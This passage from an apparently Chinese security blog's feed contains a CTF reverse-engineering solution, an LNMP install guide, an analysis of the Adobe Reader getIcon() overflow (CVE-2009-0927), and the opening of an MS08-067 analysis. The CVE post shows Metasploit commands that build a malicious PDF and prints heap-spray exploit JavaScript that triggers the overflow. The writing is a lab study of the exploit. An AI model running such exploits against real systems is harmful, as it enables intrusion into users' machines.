class="line">&#125;</span><br></pre></td></tr></table></figure><p>python 脚本，加密脚本逆着小写，flag 就出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span></span><br><span class="line">enflag=[<span class="number">105</span>, <span class="number">122</span>, <span class="number">119</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">122</span>, <span class="number">34</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">34</span>, <span class="number">118</span>, <span class="number">46</span>, <span class="number">75</span>, <span class="number">34</span>, <span class="number">46</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">0</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i])-<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="number">18</span>^enflag[i+<span class="number">1</span>])+<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="number">18</span>^enflag[i+<span class="number">2</span>]^<span class="number">6</span>)    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110529421">攻防世界-Reverse-666</a></p><p>​<a href="https://blog.csdn.net/weixin_45556441/article/details/110507144">CTF-Python常用函数语段详解</a></p><p>​<a href="http://www.ab126.com/goju/1711.html">ASCII 在线转换器</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目地址：&lt;a href=&quot;https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2&quot;&gt;666&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;将附件下载到本地后，直接拖进 I</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>安装LNMP</title>
    <link href="https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/"/>
    <id>https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/</id>
    <published>2022-07-22T00:19:12.000Z</published>
    <updated>2022-08-01T10:29:15.528Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="开启端口"><a class="markdownIt-Anchor" href="#开启端口"></a> 开启端口</h1><p>服务器：22，80，3389</p><h1 id="lnmp-是什么"><a class="markdownIt-Anchor" href="#lnmp-是什么"></a> LNMP 是什么？</h1><p>Linux  Nginx  MySQL  PHP</p><h1 id="安装-lnmp"><a class="markdownIt-Anchor" href="#安装-lnmp"></a> 安装 LNMP</h1><p>安装 screen：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install screen</span><br></pre></td></tr></table></figure><p>安装时会出现提问，都填 y</p><p>接着输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S lnmp</span><br></pre></td></tr></table></figure><p>继续输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure><p>之后会选选项，都选默认（Default）</p><p>等待安装完成后，按下Ctrl+C 退出。</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010005501.png" alt="image-20220722010005501"></p><p>现在打开浏览器，输入[服务器地址]/p.php</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011725678.png" alt="image-20220722011725678"></p><p>现在把你的域名解析到该服务器，以阿里云为例。</p><blockquote><p>注意：这里我是为了测试主机能否启用，所以用内网ip进行解析，如果您需要外网访问，请用公网ip，百度 ‘ip’ 就能看到主机IP地址。</p></blockquote><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722010346358.png" alt="image-20220722010346358" style="zoom:50%;"><p>接下来，在主机上绑定域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lnmp vhost add</span><br></pre></td></tr></table></figure><p>输入你的域名：<a href="http://test.rgzzplus.com">test.rgzzplus.com</a></p><p>接下来是问你是否需要继续解析，不用就直接回车</p><p>然后是设置文件路径，回车默认</p><p>之后的按需选择 y/n</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011100668.png" alt="image-20220722011100668"></p><p>现在，来到刚刚的默认文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>ls 后发现是空文件夹，接着就是存放我们的网站文件了</p><p>我这里直接使用小甲鱼老师提供的简历网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://test-fishc.oss-cn-hangzhou.aliyuncs.com/HWC/resume.zip</span><br></pre></td></tr></table></figure><p>下载完后，解压文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip resume.zip</span><br></pre></td></tr></table></figure><p>接下来，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www:www -R /home/wwwroot/test.rgzzplus.com/</span><br></pre></td></tr></table></figure><p>接着就能打开浏览器，查看网站了</p><p><img src="/2022/07/22/%E5%AE%89%E8%A3%85LNMP/image-20220722011559834.png" alt="image-20220722011559834"></p><img src="https://xxx.ilovefishc.com/forum/202003/03/122025sepn4rlfmrmpv8pf.png" alt="img"><blockquote><p>参考资料</p><p>​<a href="https://www.bilibili.com/video/BV1VE41147jU?p=1&amp;t=11&amp;vd_source=2fef7d81c913d5bf46b142b80676c5ec">【后端开发】10分钟教你从0搭建一台专属“云服务器”</a></p><p>​<a href="https://fishc.com.cn/forum.php?mod=forumdisplay&amp;fid=171&amp;filter=typeid&amp;typeid=301">【技术交流】<strong>小甲鱼10分钟教你从0搭建一台服务器</strong></a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;开启端口&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#开启端口&quot;&gt;&lt;/a&gt; 开启端口&lt;/h1&gt;
&lt;p&gt;服务器：22，80，3389&lt;/p&gt;
&lt;h1 id=&quot;lnmp-是什么&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="LNMP" scheme="https://www.rgzzplus.com/tags/LNMP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2009-0927：PDF中的JS</title>
    <link href="https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/"/>
    <id>https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/</id>
    <published>2022-07-22T00:16:24.000Z</published>
    <updated>2022-08-01T11:18:00.649Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="cve-2009-0927-简介"><a class="markdownIt-Anchor" href="#cve-2009-0927-简介"></a> CVE-2009-0927 简介</h1><p>Adobe Reader 是非常流行的 PDF 文件阅读器，在其 Collab 对象的 getIcon() 函数中存在一个缓冲区溢出漏洞。同时由于 PDF 文档中支持内嵌的 JavaScript，攻击者可以通过在 PDF 文档中植入恶意的 JavaScript 来向 getIcon()函数传递特制的参数以触发溢出漏洞， 并结合 Heap Spray 攻击来夺取计算机的控制权。</p><blockquote><p>Heap Spray：通过申请大量空间，来让程序命中，从而执行 shellcode</p></blockquote><h1 id="pdf-文档格式简介"><a class="markdownIt-Anchor" href="#pdf-文档格式简介"></a> PDF 文档格式简介</h1><p>PDF 文档是一种文本和二进制混排的格式，它由四部分构成。</p><ul><li>header：头部，标识 PDF 文档的版本。</li><li>body：主体，包含 PDF 文档的主体内容，各部分以对象方式呈现。</li><li>cross－reference：交叉引用表，通过交叉引用表可以快速的找到 PDF 文档中的各对象。</li><li>trailer：尾部，包含交叉引用的摘要和交叉引用表的起始位置。</li></ul><p>请新建一个 PDF 文档，用普通文本编辑器打开，参阅下边的格式注释来理解文件格式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">%<span class="variable constant_">PDF</span>-<span class="number">1.1</span> <span class="comment">//头部，说明次 PDF 文档符合 PDF1.1 规范</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Catalog</span> <span class="comment">//说明这个 obj 是 Catalog 对象</span></span><br><span class="line">    /<span class="title class_">Outlines</span> <span class="number">2</span> <span class="number">0</span> R <span class="comment">//第二个 obj 是 Outlines</span></span><br><span class="line">    /<span class="title class_">Pages</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//第三个 obj 是 Pages</span></span><br><span class="line">    /<span class="title class_">OpenAction</span> <span class="number">7</span> <span class="number">0</span> R <span class="comment">//第七个 obj 是 OpenAction，听这个名字大家也应该能感觉到有点料，文件打开时会执行它里边的脚本</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Outlines</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">0</span> <span class="comment">//0 表示没有书签</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Pages</span></span><br><span class="line">    /<span class="title class_">Kids</span> [<span class="number">4</span> <span class="number">0</span> R] <span class="comment">//说明它的孩子、页的对象号为 4</span></span><br><span class="line">    /<span class="title class_">Count</span> <span class="number">1</span> <span class="comment">//说明页码数量为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Page</span></span><br><span class="line">    /<span class="title class_">Parent</span> <span class="number">3</span> <span class="number">0</span> R <span class="comment">//其父对象的对象号为 3</span></span><br><span class="line">    /<span class="title class_">MediaBox</span> [<span class="number">0</span> <span class="number">0</span> <span class="number">612</span> <span class="number">792</span>] <span class="comment">//页面的显示大小，以象素为单位</span></span><br><span class="line">    /<span class="title class_">Contents</span> <span class="number">5</span> <span class="number">0</span> R <span class="comment">//内容对象的对象号为 5</span></span><br><span class="line">    /<span class="title class_">Resources</span> &lt;&lt; <span class="comment">//说明该页所要包含的资源，包括字体和内容的类型</span></span><br><span class="line">                <span class="regexp">/ProcSet [/PDF /Text]</span></span><br><span class="line"><span class="regexp">                /</span><span class="title class_">Font</span> &lt;&lt; /<span class="variable constant_">F1</span> <span class="number">6</span> <span class="number">0</span> R &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt; <span class="regexp">/Length 98 &gt;&gt; /</span><span class="regexp">/stream 对象为字节数，从 BT 开始， ET 结束，包括中间的行结束符</span></span><br><span class="line"><span class="regexp">stream /</span><span class="regexp">/流对象开始</span></span><br><span class="line"><span class="regexp">BT /</span><span class="variable constant_">F1</span> <span class="number">12</span> <span class="title class_">Tf</span> <span class="number">100</span> <span class="number">700</span> <span class="title class_">Td</span> <span class="number">15</span> <span class="variable constant_">TL</span> (<span class="title class_">Open</span> <span class="title class_">File</span> <span class="title class_">Error</span>! <span class="title class_">Maybe</span> the file is damaged! <span class="comment">//文本位置和内容</span></span><br><span class="line">) <span class="title class_">Tj</span> <span class="variable constant_">ET</span></span><br><span class="line">endstream <span class="comment">//流对象结束</span></span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Font</span> <span class="comment">//字体对象</span></span><br><span class="line">    /<span class="title class_">Subtype</span> /<span class="title class_">Type1</span></span><br><span class="line">    /<span class="title class_">Name</span> /<span class="variable constant_">F1</span></span><br><span class="line">    /<span class="title class_">BaseFont</span> /<span class="title class_">Helvetica</span></span><br><span class="line">    /<span class="title class_">Encoding</span> /<span class="title class_">MacRomanEncoding</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Type /</span><span class="title class_">Action</span></span><br><span class="line">    /S /<span class="title class_">JavaScript</span></span><br><span class="line">    /<span class="variable constant_">JS</span> ( <span class="comment">//可以放置 JavaScript 脚本，关键部分噢</span></span><br><span class="line">   </span><br><span class="line">   )</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref <span class="comment">//交叉引用表</span></span><br><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="comment">//说明下面的描述是从 0 号对象开始，数量为 8</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f <span class="comment">//一般每个 PDF 文件都是以这一行开始交叉应用表的，说明对象 0 的起始地址为 0000000000，产生号（generation number）为 65535，也是最大产生号，不可以再进行更改，而且最后对象的表示是 f, 表明该对象为 free</span></span><br><span class="line"><span class="number">0000000010</span> <span class="number">00000</span> n <span class="comment">//表示对象 1， 也就是 catalog 对象了，0000000009 是其偏移地址，00000 为 5 位产生号，全 0 表明该对象未被修改过， n 表示该对象在使用。</span></span><br><span class="line"><span class="number">0000000098</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000147</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000208</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000400</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000549</span> <span class="number">00000</span> n</span><br><span class="line"><span class="number">0000000663</span> <span class="number">00000</span> n</span><br><span class="line"></span><br><span class="line">trailer <span class="comment">//尾部</span></span><br><span class="line">&lt;&lt;</span><br><span class="line">    <span class="regexp">/Size 8 /</span><span class="regexp">/该 PDF 对象数</span></span><br><span class="line"><span class="regexp">    /</span><span class="title class_">Root</span> <span class="number">1</span> <span class="number">0</span> R <span class="comment">//根对象的对象号为 1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line"><span class="number">1946</span> <span class="comment">//交叉引用表的偏移地址</span></span><br><span class="line">%%<span class="variable constant_">EOF</span> <span class="comment">//文件结束标志</span></span><br></pre></td></tr></table></figure><h1 id="漏洞原理及利用分析"><a class="markdownIt-Anchor" href="#漏洞原理及利用分析"></a> 漏洞原理及利用分析</h1><h2 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h2><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>建议在虚拟机 VMware 7.0 中运行</td></tr><tr><td>Adobe Reader 版本</td><td>9.0 中文版</td><td></td></tr></tbody></table><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2><p>PDF 文件一旦被打开就会执行 OpenAction 对象里的脚本，所以只要在 OpenAction 对象中精心构造 JS 脚本，就能实现对 Adobe Reader 的攻击。</p><p>首先在 kali 中用 msf 生成样本，具体如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; msf5 &gt; search cve-<span class="number">2009</span>-0927</span><br><span class="line"></span><br><span class="line">&gt; exploit/windows/browser/adobe_geticon     <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line">&gt; exploit/windows/fileformat/adobe_geticon  <span class="number">2009</span>-03-<span class="number">24</span>       good  No     Adobe Collab.getIcon() Buffer Overflow</span><br><span class="line"></span><br><span class="line">&gt; msf5 &gt; use exploit/windows/fileformat/adobe_geticon</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span></span><br><span class="line">&gt; payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; <span class="built_in">set</span> cmd calc.exe</span><br><span class="line">&gt; cmd =&gt; calc.exe</span><br><span class="line">&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; run</span><br></pre></td></tr></table></figure><p>生成样本以后，运行一下成功弹出计算器，之后我们用<code>PDFStreamDump</code>打开，在对象5处可以看到样本中包含的payload，dump下来之后，发现payload中的js用了超长变量名，不利于阅读代码，把变量名替换以后，得到如下可读代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4096%ud6f9%u9147%ufd98%ufd9b%uf840%u9047......&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> nopblock = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"># 布置堆的内容</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">128</span>; i &gt;= <span class="number">0</span>; --i) </span><br><span class="line">&#123;</span><br><span class="line">    nopblock += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buff = nopblock + shellcode;</span><br><span class="line">nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line">headersize = <span class="number">20</span>;</span><br><span class="line">acl = headersize + buff.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nop.<span class="property">length</span> &lt; acl) </span><br><span class="line">&#123;</span><br><span class="line">    nop += nop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fillblock = nop.<span class="title function_">substring</span>(<span class="number">0</span>, acl);</span><br><span class="line">block = nop.<span class="title function_">substring</span>(<span class="number">0</span>, nop.<span class="property">length</span> - acl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (block.<span class="property">length</span> + acl &lt; <span class="number">0x40000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    block = block + block + fillblock;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">memory = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">1450</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    memory[j] = block + buff;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 用<span class="number">0x0a0a0a0a</span>占领<span class="variable constant_">SEH</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret_addr = <span class="built_in">unescape</span>(<span class="string">&quot;%0a&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (ret_addr.<span class="property">length</span> &lt; <span class="number">0x4000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ret_addr += ret_addr;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="string">&quot;N.&quot;</span> + ret_addr; <span class="comment">//注意这里的 N.</span></span><br><span class="line"><span class="title class_">Collab</span>.<span class="title function_">getIcon</span>(ret_addr);</span><br></pre></td></tr></table></figure><p>首先用 OllyDbg 加载 Adobe Reader，待其启动完成后通过 Adobe Reader 的菜单打开 POC 文档， OllyDbg 会因为一个写入异常而中断。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721154949364.png" alt="image-20220721154949364"></p><p>从上图中可以看到，程序在向 0x00130000 位置写入数据时发生异常，因为 0x00130000 这个地址已经超出程序的栈空间范围，一般是由于复制了超长字符串所致。</p><p>同时栈顶的 strncpy 也印证了我们的猜想，问题可能出现在这里，不妨进入 0x2210FE4E 区域看看。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721161909784.png" alt="image-20220721161909784"></p><p>发现在 0x2210FE25 处的 <code>call edi</code> 指令调用了 strncpy 函数，着应该就是溢出根源了。但是 strncpy 函数限制了复制字符串长度，为什么还会溢出呢？继续向上看，原来上面将源字符串长度作为了复制字符串长度，这就相当于执行了 strcpy，当源字符串长度大于目标缓冲区长度时就会发生溢出。</p><h2 id="利用分析"><a class="markdownIt-Anchor" href="#利用分析"></a> 利用分析</h2><p>漏洞原理清楚后，我们就要考虑如何利用这个漏洞了，这里我们可以选择覆盖函数的返回地址或者覆盖程序的异常处理函数指针，我们选择后者。</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163130184.png" alt="image-20220721163130184"></p><p>回顾一下 exploit 的思路：通过 Heap Spray 技术占领内存中的 0x0C0C0C0C 位置，然后再向 getIcon()函数传递超长字符串来覆盖程序的异常处理函数指针；同时这个超长字符串还有一个使命就是触发异常——当这个字符串足够长的时候（超出当前堆栈范围）就会触发写入异常，程序因此转入已被篡改了的异常处理函数，最终执行 shellcode。</p><p>最后，计算器也弹了出来：</p><p><img src="/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/image-20220721163229851.png" alt="image-20220721163229851"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;cve-2009-0927-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cve-2009-0927-简介&quot;&gt;&lt;/a&gt; CVE-2009-0927 简介&lt;/h1&gt;
&lt;p&gt;Adobe Reader 是非常流</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>RPC入侵：MS08-067</title>
    <link href="https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/"/>
    <id>https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/</id>
    <published>2022-07-20T08:15:17.000Z</published>
    <updated>2022-08-01T11:20:03.340Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ms08-067-简介"><a class="markdownIt-Anchor" href="#ms08-067-简介"></a> MS08-067 简介</h1><p>MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。</p><p>MS08-067 的溢出发生在 NetpwPathCannonicalize 函数的子函数 CanonicalizePathName 中。当路径合并至临时的栈空间 Buff_OF 后， CanonicalizePathName 函数并不是直接将其复制到输出参数 can_path 中，而是要对 Buff_OF 串做以下三步操作，以对路径规范化。</p><p>1）将合并路径中的所有的 slash 字符‘ /’（ 0x2F）转化为 backslash 字符‘ \’（ 0x5C）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">5FDDA1F0 lea eax, [ebp+Buff_OF]</span><br><span class="line">5FDDA1F6 jz short @@chk_dos_path_type</span><br><span class="line">5FDDA1F8 @@replace_slash_loop:</span><br><span class="line">5FDDA1F8 cmp word ptr [eax], &#x27;/&#x27;</span><br><span class="line">5FDDA1FC jz @@slash_to_back_slash</span><br><span class="line">5FDDA202 @@slash_to_back_forward:</span><br><span class="line">5FDDA202 inc eax</span><br><span class="line">5FDDA203 inc eax</span><br><span class="line">5FDDA204 cmp word ptr [eax], 0</span><br><span class="line">5FDDA208 jnz short @@replace_slash_loop</span><br><span class="line">...</span><br><span class="line">5FDE88EF @@slash_to_back_slash:</span><br><span class="line">5FDE88EF mov word ptr [eax], &#x27;\&#x27;</span><br><span class="line">5FDE88F4 jmp @@slash_to_back_forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2）调用子函数 CheckDosPathType，检查合并路径的 DOS 路径类型，由于与溢出无关，不用深究其原理，我们只需了解这个函数的返回值，如果返回0，代码即将进入产生溢出的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 